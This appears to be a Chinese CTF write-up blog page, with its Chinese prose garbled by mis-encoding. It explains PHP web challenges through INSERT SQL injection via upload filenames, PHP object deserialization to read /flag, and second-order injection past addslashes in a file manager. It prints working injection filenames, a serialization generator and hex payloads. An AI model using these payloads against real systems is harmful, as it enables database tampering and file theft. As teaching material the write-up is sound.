<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">&gt;</span></span>

<span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">include</span><span class="token punctuation">(</span><span class="token double-quoted-string string">&quot;./helper.php&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">class</span> <span class="token class-name">upload</span> <span class="token keyword">extends</span> <span class="token class-name">helper</span> <span class="token punctuation">{</span>
	<span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">upload_base</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
		<span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">upload</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token double-quoted-string string">&quot;file&quot;</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token double-quoted-string string">&quot;error&quot;</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
		<span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">&quot;Upload file failed.&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>
		<span class="token variable">$file</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">upload</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token variable">$file</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">upload_base</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">helper</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">&gt;</span></span>

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br><span class="line-number">39</span><br><span class="line-number">40</span><br><span class="line-number">41</span><br><span class="line-number">42</span><br><span class="line-number">43</span><br><span class="line-number">44</span><br></div></div><p>æ–‡ä»¶ä¸Šä¼ çš„è¿‡ç¨‹ä¸­filenameå¯æ§ï¼Œåœ¨check()æ–¹æ³•ä¸­ç›´æ¥åˆ©ç”¨æ²¡åšä»»ä½•å¤„ç†çš„filenameæ¥ç”Ÿæˆtitleï¼Œå¹¶ç›´æ¥æ’å…¥æ•°æ®åº“ï¼Œå¯ä»¥é€ æˆINSERTæ³¨å…¥ä»è€Œæ’å…¥æˆ‘ä»¬çš„æ¶æ„ä¿¡æ¯ã€‚</p> <p><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20200720182944.png" alt="image-20200720182919673"></p> <p><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20200720182951.png" alt="image-20200720182903470"></p> <div class="language- line-numbers-mode"><pre class="language-text"><code>//æ­£å¸¸è¯­å¥
INSERT INTO images(`title`,`filename`,`ext`,`path`,`attr`) VALUES('a','b','c','d','e')

//é€šè¿‡æ§åˆ¶filenameæ¥æ”¹å˜tileçš„å€¼æ¥é€ æˆæ³¨å…¥
//filename = 1','1','1','1','1')#.jpg -&gt; tile = 1','1','1','1','1')#

//æ³¨å…¥ä¹‹åçš„ç»“æœ
INSERT INTO images(`title`,`filename`,`ext`,`path`,`attr`) VALUES('1','1','1','1','1')#','b','c','d','e')
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br></div></div><p>é‚£è¯¥æ€ä¹ˆåˆ©ç”¨å‘¢ï¼ŸæœåŠ¡å™¨ä¼šå°†å›¾ç‰‡çš„é«˜åº¦å’Œå®½åº¦ä»¥åºåˆ—åŒ–å­—ç¬¦ä¸²çš„å½¢å¼ä¿å­˜åœ¨imagesçš„attrå­—æ®µä¸­ï¼Œå¹¶ä¸”åœ¨show.phpä¸­è¿˜ä¼šè¿›è¡Œååºåˆ—åŒ–ï¼š</p> <p><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20200720183646.png" alt="image-20200720183614013"></p> <p><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20200720183827.png" alt="image-20200720183827368"></p> <p>åœ¨helper.phpä¸­å­˜åœ¨èƒ½é€ æˆæ–‡ä»¶è¯»å–çš„æ–¹æ³•ï¼š</p> <p><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20200720183956.png" alt="image-20200720183955931"></p> <p>é‚£ä¹ˆå°±åˆ©ç”¨è¿™ä¸€ç‚¹ï¼Œåˆ©ç”¨INSERTæ³¨å…¥æ¥æ’å…¥æˆ‘ä»¬æ„é€ çš„æ¶æ„åºåˆ—åŒ–å­—ç¬¦ä¸²ï¼Œä»è€Œè¿›è¡Œæ–‡ä»¶è¯»å–ã€‚ç”Ÿæˆpayloadï¼š</p> <div class="language-php line-numbers-mode"><pre class="language-php"><code><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">class</span> <span class="token class-name">helper</span> <span class="token punctuation">{</span>
    <span class="token keyword">protected</span> <span class="token variable">$folder</span> <span class="token operator">=</span> <span class="token double-quoted-string string">&quot;pic/&quot;</span><span class="token punctuation">;</span>
	<span class="token keyword">protected</span> <span class="token variable">$ifview</span> <span class="token operator">=</span> <span class="token boolean constant">True</span><span class="token punctuation">;</span> 
	<span class="token keyword">protected</span> <span class="token variable">$config</span> <span class="token operator">=</span> <span class="token double-quoted-string string">&quot;/flag&quot;</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">helper</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</span></code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br></div></div><p>å› ä¸ºæœåŠ¡å™¨ä¼šè¿›è¡Œä¸€ä¸ªå­—ç¬¦ä¸²æ›¿æ¢çš„æ“ä½œï¼Œæ‰€ä»¥éœ€è¦å¯¹ç”Ÿæˆçš„payloadè¿›è¡Œç›¸åº”çš„å¤„ç†æ¥ä¿è¯åºåˆ—åŒ–å­—ç¬¦ä¸²æ ¼å¼æ­£ç¡®</p> <p><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20200720184503.png" alt="image-20200720184503541"></p> <div class="language- line-numbers-mode"><pre class="language-text"><code>//æ›¿æ¢å‰
O:6:&quot;helper&quot;:3:{s:9:&quot;*folder&quot;;s:4:&quot;pic/&quot;;s:9:&quot;*ifview&quot;;b:1;s:9:&quot;*config&quot;;s:5:&quot;/flag&quot;;}
//æ›¿æ¢å
O:6:&quot;helper&quot;:3:{s:9:&quot;\0\0\0folder&quot;;s:4:&quot;pic/&quot;;s:9:&quot;\0\0\0ifview&quot;;b:1;s:9:&quot;\0\0\0config&quot;;s:5:&quot;/flag&quot;;}
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br></div></div><p>å†åˆ©ç”¨INSERTæ³¨å…¥æ¥æ’å…¥payloadä»è€Œè¿›è¡Œååºåˆ—åŒ–ï¼Œä¿®æ”¹filenameä¸º<code>1','1','1','1',0x4f3a363a2268656c706572223a333a7b733a393a22002a00666f6c646572223b733a343a227069632f223b733a393a22002a00696676696577223b623a313b733a393a22002a00636f6e666967223b733a353a222f666c6167223b7d)#.jpg</code></p> <p><strong>è¿™é‡Œæœ‰ä¸ªå°tips:</strong></p> <ul><li><strong>0xå¼€å¤´çš„æ•°æ®åœ¨æ•°æ®åº“ä¸­ä¼šè¢«è‡ªåŠ¨è§£ææˆå­—ç¬¦ä¸²ï¼Œæ‰€ä»¥éœ€è¦å¯¹æˆ‘ä»¬æ›¿æ¢å¥½çš„pyloadè¿›è¡Œä¸€æ¬¡hexè½¬æ¢(bin2hex()å‡½æ•°)</strong></li></ul> <p>è¿™æ ·ä¸€æ¥ï¼Œæ’å…¥åçš„è¯­å¥å°±å˜æˆäº†ï¼š</p> <div class="language- line-numbers-mode"><pre class="language-text"><code>INSERT INTO images(`title`,`filename`,`ext`,`path`,`attr`) VALUES('1','1','1','1',0x4f3a363a2268656c706572223a333a7b733a393a22002a00666f6c646572223b733a343a227069632f223b733a393a22002a00696676696577223b623a313b733a393a22002a00636f6e666967223b733a353a222f666c6167223b7d)#','1','1','1','1')
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>å°±å¯ä»¥è¿›è¡Œè¯»å–æ–‡ä»¶äº†ï¼ŒBurpæŠ“åŒ…æ”¹ä¸€ä¸‹æ–‡ä»¶åï¼Œå†åˆ°show.phpæ‹¿flagå°±è¡Œäº†ï¼š</p> <p><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20200720185509.png" alt="image-20200720185509359"></p> <p><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20200720185613.png" alt="image-20200720185613614"></p> <h3 id="filemanager"><a href="#filemanager" class="header-anchor">#</a> filemanager</h3> <p><strong>è€ƒç‚¹ï¼š</strong></p> <ul><li><strong>äºŒæ¬¡æ³¨å…¥</strong></li></ul> <p><strong>å¦å¤–ï¼Œè¿™ä¸ªé¢˜ç›®è¿˜çº æ­£äº†æˆ‘çš„ä¸€ä¸ªè¯¯åŒºï¼š</strong></p> <ul><li><strong>ç»è¿‡addslashes()å‡½æ•°å¤„ç†ä¹‹åçš„å­—ç¬¦ä¸²è™½ç„¶æœ¬èº«å…³é”®å­—ç¬¦è¢«è½¬ä¹‰ï¼Œä½†æ˜¯å­˜å…¥æ•°æ®åº“çš„æ—¶å€™å›è‡ªåŠ¨è¿˜åŸã€‚</strong></li></ul> <div class="language-php line-numbers-mode"><pre class="language-php"><code><span class="token comment">//å®ä¾‹ä»£ç </span>

<span class="token variable">$a</span> <span class="token operator">=</span> <span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span> <span class="token comment">//æ­¤æ—¶$aæœ¬èº«å­—ç¬¦ä¸²æ”¹å˜äº†ï¼Œä½†æ˜¯å­˜å…¥æ•°æ®åº“çš„çš„æ—¶å€™å›è¢«è‡ªåŠ¨è¿˜åŸæˆè½¬ä¹‰ä¹‹å‰çš„çŠ¶æ€</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div></div><p><strong>è§£é¢˜ï¼š</strong></p> <p>é¢˜ç›®å­˜åœ¨æºç æ³„éœ²ï¼Œæ‰«ä¸€ä¸‹å¯ä»¥å¾—åˆ°www.tar.gz</p> <p>æ‹¿åˆ°æºç ï¼Œå…¶ä¸­å…³é”®ä»£ç å¦‚ä¸‹(å·²åšæ³¨é‡Š)ï¼š</p> <div class="language-php line-numbers-mode"><pre class="language-php"><code>//upload.php

<span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token comment">/**
 * Created by PhpStorm.
 * User: phithon
 * Date: 15/10/14
 * Time: ä¸‹åˆ8:45
 */</span>

<span class="token keyword">require_once</span> <span class="token double-quoted-string string">&quot;common.inc.php&quot;</span><span class="token punctuation">;</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
	<span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token double-quoted-string string">&quot;upfile&quot;</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">[</span><span class="token double-quoted-string string">&quot;error&quot;</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token constant">UPLOAD_ERR_OK</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
		<span class="token variable">$name</span> <span class="token operator">=</span> <span class="token function">basename</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">[</span><span class="token double-quoted-string string">&quot;name&quot;</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token variable">$path_parts</span> <span class="token operator">=</span> <span class="token function">pathinfo</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

		<span class="token comment">//æ£€æŸ¥æ–‡ä»¶åç¼€å</span>
		<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$path_parts</span><span class="token punctuation">[</span><span class="token double-quoted-string string">&quot;extension&quot;</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token double-quoted-string string">&quot;gif&quot;</span><span class="token punctuation">,</span> <span class="token double-quoted-string string">&quot;jpg&quot;</span><span class="token punctuation">,</span> <span class="token double-quoted-string string">&quot;png&quot;</span><span class="token punctuation">,</span> <span class="token double-quoted-string string">&quot;zip&quot;</span><span class="token punctuation">,</span> <span class="token double-quoted-string string">&quot;txt&quot;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
			<span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token double-quoted-string string">&quot;error extension&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token punctuation">}</span>
		<span class="token variable">$path_parts</span><span class="token punctuation">[</span><span class="token double-quoted-string string">&quot;extension&quot;</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token double-quoted-string string">&quot;.&quot;</span> <span class="token punctuation">.</span> <span class="token variable">$path_parts</span><span class="token punctuation">[</span><span class="token double-quoted-string string">&quot;extension&quot;</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
		<span class="token comment">//ä¿®æ”¹åç¼€åä¸º.{extension}</span>
		<span class="token variable">$name</span> <span class="token operator">=</span> <span class="token variable">$path_parts</span><span class="token punctuation">[</span><span class="token double-quoted-string string">&quot;filename&quot;</span><span class="token punctuation">]</span> <span class="token punctuation">.</span> <span class="token variable">$path_parts</span><span class="token punctuation">[</span><span class="token double-quoted-string string">&quot;extension&quot;</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

		<span class="token comment">// $path_parts[&quot;filename&quot;] = $db-&gt;quote($path_parts[&quot;filename&quot;]);</span>
		<span class="token comment">// Fix</span>
		
		<span class="token comment">//åŠ è½¬ä¹‰ç¬¦å·</span>
		<span class="token variable">$path_parts</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'filename'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$path_parts</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token comment">//{extension}ç™½åå•ç­–ç•¥ï¼Œæ–‡ä»¶ååˆç»è¿‡è½¬ä¹‰å‡½æ•°å¤„ç†ã€‚</span>
		<span class="token comment">//è¿™é‡Œåº”è¯¥æ²¡æœ‰å¯ä»¥æ³¨å…¥çš„åœ°æ–¹</span>
		<span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token double-quoted-string string">&quot;select * from `file` where `filename`='<span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$path_parts</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">}</span></span>' and `extension`='<span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$path_parts</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'extension'</span><span class="token punctuation">]</span><span class="token punctuation">}</span></span>'&quot;</span><span class="token punctuation">;</span>
		
		<span class="token comment">//æ‰§è¡Œsqlè¯­å¥</span>
		<span class="token variable">$fetch</span> <span class="token operator">=</span> <span class="token variable">$db</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token comment">//æ ¹æ®æŸ¥è¯¢çš„ç»“æœæ¥åˆ¤æ–­æ–‡ä»¶æ˜¯å¦å­˜åœ¨</span>
		<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$fetch</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">num_rows</span> <span class="token operator">&gt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
			<span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token double-quoted-string string">&quot;file is exists&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token punctuation">}</span>

		<span class="token comment">//æŠŠä¸´æ—¶æ–‡ä»¶ç§»åŠ¨åˆ°upload/{filename}ç›®å½•ä¸‹</span>
		<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">[</span><span class="token double-quoted-string string">&quot;tmp_name&quot;</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token constant">UPLOAD_DIR</span> <span class="token punctuation">.</span> <span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
			<span class="token comment">//å‘æ•°æ®åº“é‡Œæ’å…¥ä¿¡æ¯</span>
			<span class="token comment">//insert into `file` (`filename`,`view`,`extension`) values('{filename}','0','{extension}')</span>
			<span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token double-quoted-string string">&quot;insert into `file` ( `filename`, `view`, `extension`) values( '<span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$path_parts</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">}</span></span>', 0, '<span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$path_parts</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'extension'</span><span class="token punctuation">]</span><span class="token punctuation">}</span></span>')&quot;</span><span class="token punctuation">;</span>
			<span class="token comment">//æ‰§è¡Œsqlè¯­å¥</span>
			<span class="token variable">$re</span> <span class="token operator">=</span> <span class="token variable">$db</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$re</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
				<span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$db</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">error</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
				<span class="token keyword">exit</span><span class="token punctuation">;</span>
			<span class="token punctuation">}</span>
			<span class="token comment">//æ˜¾ç¤ºä¸Šä¼ çš„æ–‡ä»¶åœ°å€</span>
			<span class="token variable">$url</span> <span class="token operator">=</span> <span class="token double-quoted-string string">&quot;/&quot;</span> <span class="token punctuation">.</span> <span class="token constant">UPLOAD_DIR</span> <span class="token punctuation">.</span> <span class="token variable">$name</span><span class="token punctuation">;</span>
			<span class="token keyword">echo</span> <span class="token double-quoted-string string">&quot;Your file is upload, url:
                &lt;a href=\&quot;<span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$url</span><span class="token punctuation">}</span></span>\&quot; target='_blank'&gt;<span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$url</span><span class="token punctuation">}</span></span>&lt;/a&gt;&lt;br/&gt;
                &lt;a href=\&quot;/\&quot;&gt;go back&lt;/a&gt;&quot;</span><span class="token punctuation">;</span>
		<span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
			<span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token double-quoted-string string">&quot;upload error&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token punctuation">}</span>

	<span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
		<span class="token function">print_r</span><span class="token punctuation">(</span><span class="token function">error_get_last</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">exit</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</span></code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br><span class="line-number">39</span><br><span class="line-number">40</span><br><span class="line-number">41</span><br><span class="line-number">42</span><br><span class="line-number">43</span><br><span class="line-number">44</span><br><span class="line-number">45</span><br><span class="line-number">46</span><br><span class="line-number">47</span><br><span class="line-number">48</span><br><span class="line-number">49</span><br><span class="line-number">50</span><br><span class="line-number">51</span><br><span class="line-number">52</span><br><span class="line-number">53</span><br><span class="line-number">54</span><br><span class="line-number">55</span><br><span class="line-number">56</span><br><span class="line-number">57</span><br><span class="line-number">58</span><br><span class="line-number">59</span><br><span class="line-number">60</span><br><span class="line-number">61</span><br><span class="line-number">62</span><br><span class="line-number">63</span><br><span class="line-number">64</span><br><span class="line-number">65</span><br><span class="line-number">66</span><br><span class="line-number">67</span><br></div></div><div class="language-php line-numbers-mode"><pre class="language-php"><code>//rename.php

<span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token comment">/**
 * Created by PhpStorm.
 * User: phithon
 * Date: 15/10/14
 * Time: ä¸‹åˆ9:39
 */</span>

<span class="token keyword">require_once</span> <span class="token double-quoted-string string">&quot;common.inc.php&quot;</span><span class="token punctuation">;</span>

<span class="token comment">//req['oldname'] = addslashes(value)</span>
<span class="token comment">//req['newname'] = addslashes(value)</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$req</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'oldname'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$req</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'newname'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
	<span class="token variable">$result</span> <span class="token operator">=</span> <span class="token variable">$db</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">query</span><span class="token punctuation">(</span><span class="token double-quoted-string string">&quot;select * from `file` where `filename`='<span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$req</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'oldname'</span><span class="token punctuation">]</span><span class="token punctuation">}</span></span>'&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$result</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">num_rows</span> <span class="token operator">&gt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
		<span class="token variable">$result</span> <span class="token operator">=</span> <span class="token variable">$result</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">fetch_assoc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
		<span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token double-quoted-string string">&quot;old file doesn't exists!&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>

		<span class="token variable">$req</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'newname'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">basename</span><span class="token punctuation">(</span><span class="token variable">$req</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'newname'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token comment">//å‘æ•°æ®åº“ä¸­å–å‡ºæ•°æ®å¹¶æ²¡æœ‰ç»è¿‡å‡½æ•°å¤„ç†ï¼Œå­˜åœ¨äºŒæ¬¡æ³¨å…¥</span>
		<span class="token comment">//æ•°æ®æ— æ³•ä¼ å…¥åç¼€å</span>
		<span class="token variable">$re</span> <span class="token operator">=</span> <span class="token variable">$db</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">query</span><span class="token punctuation">(</span><span class="token double-quoted-string string">&quot;update `file` set `filename`='<span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$req</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'newname'</span><span class="token punctuation">]</span><span class="token punctuation">}</span></span>', `oldname`='<span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$result</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">}</span></span>' where `fid`=<span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$result</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'fid'</span><span class="token punctuation">]</span><span class="token punctuation">}</span></span>&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$re</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
			<span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$db</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">error</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token keyword">exit</span><span class="token punctuation">;</span>
		<span class="token punctuation">}</span>
		<span class="token variable">$oldname</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_DIR</span> <span class="token punctuation">.</span> <span class="token variable">$result</span><span class="token punctuation">[</span><span class="token double-quoted-string string">&quot;filename&quot;</span><span class="token punctuation">]</span> <span class="token punctuation">.</span> <span class="token variable">$result</span><span class="token punctuation">[</span><span class="token double-quoted-string string">&quot;extension&quot;</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
		<span class="token variable">$newname</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_DIR</span> <span class="token punctuation">.</span> <span class="token variable">$req</span><span class="token punctuation">[</span><span class="token double-quoted-string string">&quot;newname&quot;</span><span class="token punctuation">]</span> <span class="token punctuation">.</span> <span class="token variable">$result</span><span class="token punctuation">[</span><span class="token double-quoted-string string">&quot;extension&quot;</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
